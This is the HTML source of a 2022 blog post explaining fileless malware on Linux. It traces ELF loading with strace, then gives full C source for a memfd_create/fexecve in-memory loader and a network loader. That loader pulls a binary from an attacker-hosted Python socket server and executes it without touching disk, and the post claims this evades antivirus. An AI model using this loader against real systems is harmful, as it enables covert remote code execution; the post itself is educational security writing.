<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>File-less malwares: what and how | Connected</title>
<meta name=keywords content="C programming,security,linux"><meta name=description content="What are file-less malwares? How do they work on linux?
According to Wikipedia, file-less malware is a variant of computer related malicious software that exists exclusively as a computer memory-based artifact i.e. in RAM.
In other words, the malware/program is never written to harddisk but directly loaded in memory.
To get a better understanding of how that happens in linux, we need to understand how a normal program loads itself into memory and executes itself."><meta name=author content="ayedaemon"><link rel=canonical href=https://ayedaemon.github.io/post/2022/02/fileless-malwares-how-and-why/><link crossorigin=anonymous href=/assets/css/stylesheet.5cfc680b1eeaeef9efbced92d46c2a9e876b72ee14fba85846afc4cff9e6e6f8.css integrity="sha256-XPxoCx7q7vnvvO2S1Gwqnodrcu4U+6hYRq/Ez/nm5vg=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://ayedaemon.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ayedaemon.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ayedaemon.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://ayedaemon.github.io/apple-touch-icon.png><link rel=mask-icon href=https://ayedaemon.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="File-less malwares: what and how"><meta property="og:description" content="What are file-less malwares? How do they work on linux?
According to Wikipedia, file-less malware is a variant of computer related malicious software that exists exclusively as a computer memory-based artifact i.e. in RAM.
In other words, the malware/program is never written to harddisk but directly loaded in memory.
To get a better understanding of how that happens in linux, we need to understand how a normal program loads itself into memory and executes itself."><meta property="og:type" content="article"><meta property="og:url" content="https://ayedaemon.github.io/post/2022/02/fileless-malwares-how-and-why/"><meta property="article:section" content="post"><meta property="article:published_time" content="2022-02-26T23:43:01+05:30"><meta property="article:modified_time" content="2023-11-23T22:32:16+05:30"><meta property="og:site_name" content="Connected"><meta name=twitter:card content="summary"><meta name=twitter:title content="File-less malwares: what and how"><meta name=twitter:description content="What are file-less malwares? How do they work on linux?
According to Wikipedia, file-less malware is a variant of computer related malicious software that exists exclusively as a computer memory-based artifact i.e. in RAM.
In other words, the malware/program is never written to harddisk but directly loaded in memory.
To get a better understanding of how that happens in linux, we need to understand how a normal program loads itself into memory and executes itself."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ayedaemon.github.io/post/"},{"@type":"ListItem","position":2,"name":"File-less malwares: what and how","item":"https://ayedaemon.github.io/post/2022/02/fileless-malwares-how-and-why/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"File-less malwares: what and how","name":"File-less malwares: what and how","description":"What are file-less malwares? How do they work on linux?\nAccording to Wikipedia, file-less malware is a variant of computer related malicious software that exists exclusively as a computer memory-based artifact i.e. in RAM.\nIn other words, the malware/program is never written to harddisk but directly loaded in memory.\nTo get a better understanding of how that happens in linux, we need to understand how a normal program loads itself into memory and executes itself.","keywords":["C programming","security","linux"],"articleBody":" What are file-less malwares? How do they work on linux?\nAccording to Wikipedia, file-less malware is a variant of computer related malicious software that exists exclusively as a computer memory-based artifact i.e. in RAM.\nIn other words, the malware/program is never written to harddisk but directly loaded in memory.\nTo get a better understanding of how that happens in linux, we need to understand how a normal program loads itself into memory and executes itself. If you already know this, feel free to skip next section.\nHow normal program loads and executes itself? This is a “HUGE” topic for a mere blog post. So we’ll just scratch the surface and understand about ELF files. ELF Files are main binary format in use on modern Linux systems, and support for it is implemented in the file fs/binfmt_elf.c.\nLet’s build our own C program to generate an ELF binary so we can follow and know what we are doing.\nCreate a C program file with vim not_hello_world.c, and paste the below code into it.\n#include int main(int argc, char* argv[], char* envp[]) { // Prints total argument count passed to executable printf(\"Argument count : %2d\\n\", argc); // Prints the arguments list along with memory location printf(\"Arguments list :\\n\"); for(int i=0; i\u003cargc; i++) { printf(\"\\targv[%1$d] =[ %2$p ]==\u003e %2$s\\n\", i, argv[i]); } // Prints all the environment variables passed to executable printf(\"Environment list :\\n\"); for(int i=0; envp[i]; i++) { printf(\"\\tenvp[%1$d] =[ %2$p ]==\u003e %2$s\\n\", i, envp[i]); } } The above code will print out the argc, argv and envp values to the standard output.\nCompile it : gcc not_hello_world.c -o not_hello_world.o\nCheck file type : file not_hello_world.o\nnot_hello_world.o: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=82cad832f6d9b9a2d071be6bca3ccab87c8c71f6, for GNU/Linux 3.2.0, not stripped Run it : ./not_hello_world.o 12345 123 12345678901234567890 1234\nArgument count : 5 Arguments list : argv[0] =[ 0x7ffd3bd9370c ]==\u003e ./not_hello_world.o argv[1] =[ 0x7ffd3bd93720 ]==\u003e 12345 argv[2] =[ 0x7ffd3bd93726 ]==\u003e 123 argv[3] =[ 0x7ffd3bd9372a ]==\u003e 12345678901234567890 argv[4] =[ 0x7ffd3bd9373f ]==\u003e 1234 Environment list : envp[0] =[ 0x7ffd3bd93744 ]==\u003e SHELL=/bin/bash envp[1] =[ 0x7ffd3bd93754 ]==\u003e LANGUAGE=en_US: envp[2] =[ 0x7ffd3bd93764 ]==\u003e PWD=/home/vagrant/workspace/blog_junk envp[3] =[ 0x7ffd3bd9378a ]==\u003e LOGNAME=vagrant envp[4] =[ 0x7ffd3bd9379a ]==\u003e XDG_SESSION_TYPE=tty envp[5] =[ 0x7ffd3bd937af ]==\u003e MOTD_SHOWN=pam envp[6] =[ 0x7ffd3bd937be ]==\u003e HOME=/home/vagrant envp[7] =[ 0x7ffd3bd937d1 ]==\u003e LANG=en_US.UTF-8 envp[8] =[ 0x7ffd3bd937e2 ]==\u003e LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36: envp[9] =[ 0x7ffd3bd93dc4 ]==\u003e SSH_CONNECTION=10.0.2.2 34954 10.0.2.15 22 envp[10] =[ 0x7ffd3bd93def ]==\u003e LESSCLOSE=/usr/bin/lesspipe %s %s envp[11] =[ 0x7ffd3bd93e11 ]==\u003e XDG_SESSION_CLASS=user envp[12] =[ 0x7ffd3bd93e28 ]==\u003e TERM=tmux-256color envp[13] =[ 0x7ffd3bd93e3b ]==\u003e LESSOPEN=| /usr/bin/lesspipe %s envp[14] =[ 0x7ffd3bd93e5b ]==\u003e USER=vagrant envp[15] =[ 0x7ffd3bd93e68 ]==\u003e SHLVL=1 envp[16] =[ 0x7ffd3bd93e70 ]==\u003e XDG_SESSION_ID=6 envp[17] =[ 0x7ffd3bd93e81 ]==\u003e XDG_RUNTIME_DIR=/run/user/1000 envp[18] =[ 0x7ffd3bd93ea0 ]==\u003e SSH_CLIENT=10.0.2.2 34954 22 envp[19] =[ 0x7ffd3bd93ebd ]==\u003e XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop envp[20] =[ 0x7ffd3bd93efe ]==\u003e PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin envp[21] =[ 0x7ffd3bd93f66 ]==\u003e DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus envp[22] =[ 0x7ffd3bd93f9c ]==\u003e SSH_TTY=/dev/pts/0 envp[23] =[ 0x7ffd3bd93faf ]==\u003e _=./not_hello_world.o envp[24] =[ 0x7ffd3bd93fc5 ]==\u003e OLDPWD=/home/vagrant/workspace This still does not gives us what is happening behind the scenes, but it tells us that each program has some dedicated memory space where it stores a copy of arguments and environment variables in continuous memory locations. To gather more information we can use the strace utility to trace the system calls made by our program.\nCommand: strace ./not_hello_world.o myarg1 myarg2 myarg3 2\u003estrace_output.log 1\u003eprogram_output.log\nNOTE:- 2(stderr) redirected to strace_output.log file and 1(stdout) redirected to program_output.log file\ncommand : cat strace_output.log\nexecve(\"./not_hello_world.o\", [\"./not_hello_world.o\", \"myarg1\", \"myarg2\", \"myarg3\"], 0x7ffe0dbf2cf8 /* 25 vars */) = 0 brk(NULL) = 0x5593be003000 arch_prctl(0x3001 /* ARCH_??? */, 0x7ffea24b4bc0) = -1 EINVAL (Invalid argument) access(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3 fstat(3, {st_mode=S_IFREG|0644, st_size=28934, ...}) = 0 mmap(NULL, 28934, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ff99a640000 close(3) = 0 openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3 read(3, \"\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u003e\\0\\1\\0\\0\\0\\360q\\2\\0\\0\\0\\0\\0\"..., 832) = 832 pread64(3, \"\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0\"..., 784, 64) = 784 pread64(3, \"\\4\\0\\0\\0\\20\\0\\0\\0\\5\\0\\0\\0GNU\\0\\2\\0\\0\\300\\4\\0\\0\\0\\3\\0\\0\\0\\0\\0\\0\\0\", 32, 848) = 32 pread64(3, \"\\4\\0\\0\\0\\24\\0\\0\\0\\3\\0\\0\\0GNU\\0\\t\\233\\222%\\274\\260\\320\\31\\331\\326\\10\\204\\276X\u003e\\263\"..., 68, 880) = 68 fstat(3, {st_mode=S_IFREG|0755, st_size=2029224, ...}) = 0 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ff99a63e000 pread64(3, \"\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0\"..., 784, 64) = 784 pread64(3, \"\\4\\0\\0\\0\\20\\0\\0\\0\\5\\0\\0\\0GNU\\0\\2\\0\\0\\300\\4\\0\\0\\0\\3\\0\\0\\0\\0\\0\\0\\0\", 32, 848) = 32 pread64(3, \"\\4\\0\\0\\0\\24\\0\\0\\0\\3\\0\\0\\0GNU\\0\\t\\233\\222%\\274\\260\\320\\31\\331\\326\\10\\204\\276X\u003e\\263\"..., 68, 880) = 68 mmap(NULL, 2036952, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ff99a44c000 mprotect(0x7ff99a471000, 1847296, PROT_NONE) = 0 mmap(0x7ff99a471000, 1540096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7ff99a471000 mmap(0x7ff99a5e9000, 303104, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19d000) = 0x7ff99a5e9000 mmap(0x7ff99a634000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7ff99a634000 mmap(0x7ff99a63a000, 13528, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ff99a63a000 close(3) = 0 arch_prctl(ARCH_SET_FS, 0x7ff99a63f540) = 0 mprotect(0x7ff99a634000, 12288, PROT_READ) = 0 mprotect(0x5593bdded000, 4096, PROT_READ) = 0 mprotect(0x7ff99a675000, 4096, PROT_READ) = 0 munmap(0x7ff99a640000, 28934) = 0 fstat(1, {st_mode=S_IFREG|0644, st_size=0, ...}) = 0 brk(NULL) = 0x5593be003000 brk(0x5593be024000) = 0x5593be024000 write(1, \"Argument count : 4\\nArguments li\"..., 3244) = 3244 exit_group(0) = ? +++ exited with 0 +++ At first it looks confusing and very difficult to understand, but is very simple and straight forward once you have understood the format of this output.\n# Format of the strace output. syscall(arg1, arg2, arg3, ... ) = Return value Now if we look at line-1 of the strace_output.log file, with the newly gained insight. It is very clear that we are calling execve syscall and passing arguments to it.\nAccording to man 2 execve –\u003e execve() executes the program referred to by pathname. This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.\nThis concludes that the execve() syscall is actually responsible to load the executable ELF file into memory!! Interestingly, our binary reads (gathers) all the data to be printed from multiple locations and then print it at once at end with a single write() syscall. The return value for write() denotes the number of bytes the syscall wrote. This is the exact amount of chars that was supposed to be written out on stdout but we redirected it to a file. Now we can check if the byte counts are same or not.\nWe can check if the byte counts in the file match the byte count returned by write() syscall, using –\u003e wc -c program_output.log\noutput:\n3244 program_output.log With this, we know how a normal program executes in Memory. Below diagram summarizes it for a quick recap.\nC program │ │ │ Compiles │ ▼ ELF binary │ │ │ execve │ ▼ loaded in memory Idea of file-less? In usual scenarios, we have a compiled malicious binary stored on the victim’s machine, that’s then executed somehow for the malicious purpose of the attacker. Here we have multiple simpler methods and tools to analyze the binary and know what it is going to do. Most of the times, our antivirus can scan system’s harddisk and know if there is a malware or a not.\nAnd we all trust our anti-virus for that!! 😜\nBut what if an attacker somehow loaded the ELF file directly into the memory, without writing it to harddisk (not even a temp file). In linux, one of the way to do that is via memfd_create() syscall. This creates an “anonymous file” and returns a “file descriptor” to it.\nOK! This had me with the first line of the man page - man 2 memfd_create. But there is more to it.\nmemfd_create() creates an anonymous file and returns a file descriptor that refers to it. The file behaves like a regular file, and so can be modified, truncated, memory-mapped, and so on. However, unlike a regular file, it lives in RAM and has a volatile backing storage. Once all references to the file are dropped, it is automatically released. Anonymous memory is used for all backing pages of the file. Therefore, files created by memfd_create() have the same semantics as other anonymous memory allocations such as those allocated using mmap(2) with the MAP_ANONYMOUS flag. We can now create a file directly in RAM all we need is a way to execute it. We could have used same old execve for this but we don’t have a file pathname to begin with. After looking through the variants of the exec family syscalls, I stumbled upon fexecve() - execute program specified via file descriptor.\nNow we have both, a way to create in memory files by memfd_create() and execute it with fexecve(). We just need a program to glue everything together with a neat logic to make things work the way you want it.\nFirst fileless program in C I’ve written a simple C program (loader.c) that creates an in-memory file and copies the data of a (local) binary to it. And then executes it. Simple, isn’t it.\n#include #include #include #include #include #include #include #define _GNU_SOURCE /* See feature_test_macros(7) */ #define BUFF_SIZE 1024 int memfd_create(const char *name, unsigned int flags); // Prints usage of the program - takes program name as argument - argv[0] void usage(char* prog) { char *use = \"USAGE: %1$s /path/to/binary arg_to_binary1 arg_to_binary2 ...\\n\"; printf(use, prog); } // Prints error message and the error number message; exits with errno. void die(char* msg) { printf(\"[ - ] %s\\n\", msg); printf(\"[ ? ] %s\", strerror(errno)); exit(errno); } int main(int argc, char* argv[], char* envp[]) { int fd1, fd2; char buff[BUFF_SIZE] = {0}; // Creates a buffer with all values as 0; if (argc \u003c 2) { // Checks if any argument is passed or not. usage(argv[0]); exit(1); } // Create mem file (fd1) printf(\"[ * ] Trying to create a mem file...\\n\"); fd1 = memfd_create(\"testfd\", 0); if (fd1 \u003c 0) die(\"Can't create memfd file\"); printf(\"[ + ] Created mem file and attached to fd = %d\\n\", fd1); // Read a local binary (fd2) and write to mem file (fd1) printf(\"[ * ] Reading %s file\\n\", argv[1]); if ((fd2 = open(argv[1], O_RDONLY)) == -1) die(\"Can't open file\"); printf(\"\\n ----------------------------------- \\n\"); int i = 0, j = 0; int read_count = 0, write_count = 0; while( (read_count = read(fd2, buff, BUFF_SIZE)) != 0 ) { if( (write_count = write(fd1, buff, read_count)) == -1) die(\"Failed to write to mem file\"); i += read_count; j += write_count; printf(\"\\rRead count = %6d | Write count = %3d\", i, j); } printf(\"\\n ----------------------------------- \\n\"); printf(\"[ + ] Starting execution...\\n\"); // Change argv params; removes the argv[0] // printf(\"%s %s %s %s\\n\", argv[0], argv[1], argv[2], argv[3]); for(int i=0; i\u003cargc; ++i) argv[i] = argv[i+1]; // printf(\"%s %s %s %s\\n\", argv[0], argv[1], argv[2], argv[3]); // Execute fd1 - with new argv and same envp fexecve(fd1, argv, envp); // If fexecve returns, then it is failed. printf(\"Failed Executing....\\n\"); return errno; } We should give some time to understand this code on why and how it’ll load what in memory.\nWe can compile this code to generate an ELF file with gcc loader.c -o loader.o; Once compiled, we can run it with ./loader.o\nSince there are no arguments(argc\u003c2), it should fail with usage information on stdout.\nUSAGE: ./loader.o /path/to/binary arg_to_binary1 arg_to_binary2 ... Let’s try again with some arguments this time.\n./loader.o /usr/bin/file loader.o This time things will not be same as last time. It’ll :-\nCreates an in-memory file and gets a file descriptor back (fd1). Opens local binary file (argv[1] = /usr/bin/file); Stores this file descriptor in fd2. Read-write loop until everything from fd2 is written in fd1. Change argv to be passed to in-mem file. The new argv value should look like –\u003e /usr/bin/file arg1 arg2 arg3. This means we just have to remove the argv[0] and set everything remaining in proper index values. Execute fd1 –\u003e in-memory file. Output:\n[ * ] Trying to create a mem file... [ + ] Created mem file and attached to fd = 3 [ * ] Reading /usr/bin/file file ----------------------------------- Read count = 27104 | Write count = 27104 ----------------------------------- [ + ] Starting execution... loader.o: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=426a7743592788cd18c92a76f22ccfb632700d7b, for GNU/Linux 3.2.0, with debug_info, not stripped Last line of the output is the proof that our in-memory file executed successfully… Now we can take it to next level.\nloading binary from network Till this point, we know how to write a basic code to load a local binary, create a in-mem file for it and then execute it.\nBut an attacker won’t just use it run the local binaries which can be executed directly, instead he would like to execute a binary sitting on his server and load that into victim’s system directly in memory. This will not be detected with the help of any disk analysis tool or commands like ls. Also, this will be executing safe from “Anti-Virus” software complete disk-scan features. In theory, attacker could run anything from his system on victim’s system without leaving any trace on harddisk.\nTo simulate this, I’ve created a pre-setup with a server that hosts a malicious binary and victim’s system where we have the loader.o present.\nWithout further ado, let’s get things prepared for out test. We need 3 things:\nloader binary (on victim’s machine) malicious binary (on attacker’s machine) tcp socket server to host malicious binary (on attacker’s machine) I started out with a (not so) malicious binary, which simply creates a plain-text file when executed.\nSource Code: malicious_program.c\n#include int main() { char* data = \"This malicious program wishes you to have a good day!!\"; FILE* fPtr = fopen(\"NOTICE_for_U.txt\", \"w\"); if(!fPtr) return 1; fputs(data, fPtr); fclose(fPtr); return 0; } Compile it -\u003e gcc malicious_program.c -o malicious_program.o\nNext, I wrote a small python tcp socket server that will host the malicious_program.o binary.\nSource Code: python_server.py\n# Read binary with open(\"malicious_program.o\", \"rb\") as f: data = f.read() print(len(data)) # Host it on 192.168.56.56:1234 import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) s.bind(('192.168.56.56', 1234)) s.listen(1) conn, addr = s.accept() print(conn, addr) # Prints the incoming Connection details conn.sendall(data) conn.close() Finally, we modify the previous local binary loader code to read from connected socket instead of a local binary.\nSource code: network_loader.c\n#include #include #include #include #include #include #include #include #include #define _GNU_SOURCE /* See feature_test_macros(7) */ #define BUFF_SIZE 1024 int memfd_create(const char *name, unsigned int flags); void usage(char* prog) { char *use = \"USAGE: %1$s Destination Port ...\\n\"; printf(use, prog); } void die(char* msg) { printf(\"[ - ] %s\\n\", msg); printf(\"[ ? ] %s\", strerror(errno)); exit(errno); } int main(int argc, char* argv[], char* envp[]) { int fd1; char buff[BUFF_SIZE] = {0}; if (argc \u003c 2) { usage(argv[0]); exit(1); } // Create mem file (fd1) printf(\"[ * ] Trying to create a mem file...\\n\"); fd1 = memfd_create(\"testfd\", 0); if (fd1 \u003c 0) die(\"Can't create memfd file\"); printf(\"[ + ] Created mem file and attached to fd = %d\\n\", fd1); // Socket stuff begins here struct sockaddr_in serv_addr; int sock = 0; if ((sock = socket(AF_INET, SOCK_STREAM, 0)) \u003c 0) die(\"Socket not created\"); serv_addr.sin_family = AF_INET; serv_addr.sin_port = htons(strtol(argv[2], NULL, 10)); // set port if(inet_pton(AF_INET, argv[1], \u0026serv_addr.sin_addr)\u003c=0) // set address die(\"Invalid address\"); if (connect(sock, (struct sockaddr *)\u0026serv_addr, sizeof(serv_addr)) \u003c 0) // connect die(\"Connection failed\"); printf(\"\\n ----------------------------------- \\n\"); int i = 0, j = 0; int read_count = 0, write_count = 0; while( (read_count = read( sock , buff, BUFF_SIZE)) != 0 ) { if( (write_count = write(fd1, buff, read_count)) == -1) die(\"Failed to write to mem file\"); i += read_count; j += write_count; printf(\"\\rRead count = %6d | Write count = %3d\", i, j); } printf(\"\\n ----------------------------------- \\n\"); printf(\"[ + ] Starting execution...\\n\"); // Change argv params // printf(\"BEFORE: %s %s %s %s\\n\", argv[0], argv[1], argv[2], argv[3]); for(int i=0; i\u003cargc; ++i) argv[i] = argv[i+1]; // printf(\"AFTER: %s %s %s %s\\n\", argv[0], argv[1], argv[2], argv[3]); // Execute fd1 - with new argv fexecve(fd1, argv, envp); // If fexecve returns, then it is failed. printf(\"Failed Executing....\\n\"); return errno; } Compile it –\u003e gcc network_loader.c -o network_loader.o\nWith this, we have everything ready with us. Some more steps and we are done.\nStart the python server on attacker’s machine. - python3 python_server.py Place the network_loader.o on victim’s machine. Politely ask the victim to execute the binary - ./network_loader.o 192.168.56.56 1234 Sit back and enjoy! ## On Attacker's machine $ python3 python_server.py 16800 \u003csocket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('192.168.56.56', 1234), raddr=('192.168.56.56', 50812)\u003e ('192.168.56.56', 50812) ## on victim's machine $ ./network_loader.o 192.168.56.56 1234 [ * ] Trying to create a mem file... [ + ] Created mem file and attached to fd = 3 ----------------------------------- Read count = 16800 | Write count = 16800 ----------------------------------- [ + ] Starting execution... And if we check the victim’s working directory we can see a file with name NOTICE_for_U.txt there…. which confirms that the remote binary successfully ran on victim’s machine.\nVoila! We just executed a remotely located binary without leaving anytrace on harddisk for further analysis. What we have is a loader binary that reads unknown data from somewhere and just executes it. And there is nothing in the loader binary that could be detected as malicious by most of the automated analysis tools… even VirusTotal does not detect it for what it is.\nCVE-2021-4038 describes as a local privilege escalation vulnerability that was found on polkit’s pkexec utility. I’m not sure if it is a false positive or based on similar signatures.\nReferences How programs get run: ELF binaries (lwn.net) Chapter 3 - Memory Management (tldp.org) Fileless Malwares (wikipedia.org) what is fileless malware (norton.com) covert code faces a heap of trouble in memory (sophos.com) Intelligence: File less threats (microsoft.com) ","wordCount":"2876","inLanguage":"en","datePublished":"2022-02-26T23:43:01+05:30","dateModified":"2023-11-23T22:32:16+05:30","author":[{"@type":"Person","name":"ayedaemon"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://ayedaemon.github.io/post/2022/02/fileless-malwares-how-and-why/"},"publisher":{"@type":"Organization","name":"Connected","logo":{"@type":"ImageObject","url":"https://ayedaemon.github.io/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://ayedaemon.github.io/ accesskey=h title="Connected (Alt + H)">Connected</a><div class=logo-switches></div></div><ul id=menu><li><a href=https://ayedaemon.github.io/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://ayedaemon.github.io/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://ayedaemon.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://ayedaemon.github.io/series/ title=Series><span>Series</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://ayedaemon.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://ayedaemon.github.io/post/>Posts</a></div><h1 class=post-title>File-less malwares: what and how</h1><div class=post-meta><span title='2022-02-26 23:43:01 +0530 +0530'>February 26, 2022</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;2876 words&nbsp;·&nbsp;ayedaemon&nbsp;|&nbsp;<a href=https://github.com/ayedaemon/ayedaemon.github.io/tree/main/content/post/2022/02/fileless-malwares-how-and-why.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><ul><li><a href=#how-normal-program-loads-and-executes-itself>How normal program loads and executes itself?</a></li><li><a href=#idea-of-file-less>Idea of file-less?</a></li><li><a href=#first-fileless-program-in-c>First fileless program in C</a></li><li><a href=#loading-binary-from-network>loading binary from network</a></li><li><a href=#references>References</a></li></ul></li></ul></nav></div></details></div><div class=post-content><blockquote><p>What are file-less malwares? How do they work on linux?</p></blockquote><p>According to Wikipedia, <strong>file-less malware</strong> is a variant of computer related malicious software that exists exclusively as a computer memory-based artifact i.e. in RAM.</p><p>In other words, the malware/program is never written to harddisk but directly loaded in memory.</p><p><img loading=lazy src=https://media.giphy.com/media/521JLj0YGzz6AEWsZ5/giphy.gif alt=How???></p><p>To get a better understanding of how that happens in linux, we need to understand how a normal program loads itself into memory and executes itself. If you already know this, feel free to skip next section.</p><h3 id=how-normal-program-loads-and-executes-itself>How normal program loads and executes itself?<a hidden class=anchor aria-hidden=true href=#how-normal-program-loads-and-executes-itself>#</a></h3><p>This is a &ldquo;HUGE&rdquo; topic for a mere blog post. So we&rsquo;ll just scratch the surface and understand about ELF files. ELF Files are main binary format in use on modern Linux systems, and support for it is implemented in the file <a href=https://elixir.bootlin.com/linux/v5.16.10/source/fs/binfmt_elf.c>fs/binfmt_elf.c</a>.</p><p>Let&rsquo;s build our own C program to generate an ELF binary so we can follow and know what we are doing.</p><p>Create a C program file with <code>vim not_hello_world.c</code>, and paste the below code into it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>*</span> <span class=n>envp</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Prints total argument count passed to executable
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Argument count : %2d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// Prints the arguments list along with memory location
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Arguments list :</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
